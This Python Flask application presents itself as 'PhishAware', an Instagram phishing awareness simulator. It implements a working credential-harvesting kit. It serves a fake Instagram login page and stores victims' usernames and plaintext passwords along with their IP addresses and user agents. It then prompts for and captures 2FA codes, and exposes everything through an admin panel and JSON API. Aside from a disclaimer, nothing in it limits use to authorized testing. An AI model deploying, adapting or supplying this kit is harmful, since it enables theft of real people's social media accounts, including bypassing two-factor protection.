"""
PhishAware - Instagram Phishing Awareness Simulator
FOR AUTHORIZED SECURITY TESTING AND EDUCATION ONLY
Requires explicit written consent before deployment
"""

import os
import json
import time
import uuid
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

app = Flask(__name__)
app.secret_key = os.urandom(32)

# Configuration - change these via environment variables
ADMIN_USER = os.getenv('ADMIN_USER', 'security_admin')
ADMIN_PASS = os.getenv('ADMIN_PASS', 'ChangeMeRightNow!')
CAPTURE_FILE = os.getenv('CAPTURE_FILE', 'captured_credentials.json')
APP_PORT = int(os.getenv('APP_PORT', 5000))

# In-memory store (also persisted to file)
captured_data = []


def load_captured():
    """Load captured data from JSON file if it exists."""
    global captured_data
    if os.path.exists(CAPTURE_FILE):
        try:
            with open(CAPTURE_FILE, 'r') as f:
                captured_data = json.load(f)
        except (json.JSONDecodeError, IOError):
            captured_data = []


def save_captured():
    """Persist captured data to JSON file."""
    with open(CAPTURE_FILE, 'w') as f:
        json.dump(captured_data, f, indent=2)


def log_capture(username, password, ip, user_agent, status="captured", twofa_code=None):
    """Log captured credentials with metadata."""
    entry = {
        "id": str(uuid.uuid4())[:8],
        "timestamp": datetime.utcnow().isoformat(),
        "username": username,
        "password": password,
        "ip_address": ip,
        "user_agent": user_agent,
        "status": status,
    }
    if twofa_code:
        entry["two_fa_code"] = twofa_code

    captured_data.append(entry)
    save_captured()

    # Also print to console for real-time monitoring
    print(f"\n[!] CAPTURE #{len(captured_data)}")
    print(f"    Username : {username}")
    print(f"    Password : {password}")
    if twofa_code:
        print(f"    2FA Code : {twofa_code}")
    print(f"    IP       : {ip}")
    print(f"    Time     : {entry['timestamp']}")
    print(f"    Status   : {status}\n")


@app.route('/')
def login():
    """Serve the simulated Instagram login page."""
    return render_template('login.html')


@app.route('/login', methods=['POST'])
def handle_login():
    """Handle login form submission."""
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', 'Unknown')

    if not username or not password:
        return render_template('login.html', error="Please enter both username and password.")

    # Log the capture
    log_capture(username, password, ip, ua, status="captured")

    # Simulate 2FA being required (in a real training scenario)
    session['username'] = username
    session['password'] = password
    session['ip'] = ip
    session['ua'] = ua

    return redirect(url_for('twofa'))


@app.route('/2fa')
def twofa():
    """Serve the simulated 2FA page."""
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('login_2fa.html', username=session.get('username', ''))


@app.route('/verify', methods=['POST'])
def handle_2fa():
    """Handle 2FA code submission."""
    code = request.form.get('code', '').strip()
    username = session.get('username', 'unknown')
    password = session.get('password', 'unknown')
    ip = session.get('ip', request.remote_addr)
    ua = session.get('ua', request.headers.get('User-Agent', 'Unknown'))

    if code:
        log_capture(username, password, ip, ua, status="2fa_captured", twofa_code=code)

    # Redirect to a training/educational page
    return render_template('login.html', 
                          message="This was a simulated phishing test. "
                                  "Your credentials were NOT actually compromised. "
                                  "Please contact your security team for training.")


@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    """Admin login page."""
    if request.method == 'POST':
        user = request.form.get('username', '')
        pwd = request.form.get('password', '')
        if user == ADMIN_USER and pwd == ADMIN_PASS:
            session['admin'] = True
            return redirect(url_for('admin_panel'))
        return render_template('admin.html', error="Invalid credentials", login=True)
    return render_template('admin.html', login=True)


@app.route('/admin/panel')
def admin_panel():
    """Admin panel showing all captured data."""
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    return render_template('admin.html', login=False, data=captured_data, 
                          count=len(captured_data))


@app.route('/admin/api/data')
def admin_api_data():
    """JSON API endpoint for captured data."""
    if not session.get('admin'):
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify(captured_data)


@app.route('/admin/clear', methods=['POST'])
def admin_clear():
    """Clear all captured data."""
    if not session.get('admin'):
        return jsonify({"error": "Unauthorized"}), 401
    global captured_data
    captured_data = []
    save_captured()
    return redirect(url_for('admin_panel'))


@app.route('/logout')
def logout():
    """Logout of admin panel."""
    session.clear()
    return redirect(url_for('login'))


if __name__ == '__main__':
    load_captured()
    print("""
    ╔══════════════════════════════════════════════╗
    ║         PhishAware - Awareness Tool           ║
    ║  FOR AUTHORIZED SECURITY TESTING ONLY         ║
    ╚══════════════════════════════════════════════╝
    """)
    print(f" [!] Admin panel: http://localhost:{APP_PORT}/admin")
    print(f" [!] Captures logged to: {CAPTURE_FILE}")
    print(f" [!] Login page: http://localhost:{APP_PORT}/")
    print()
    app.run(host='0.0.0.0', port=APP_PORT, debug=False)
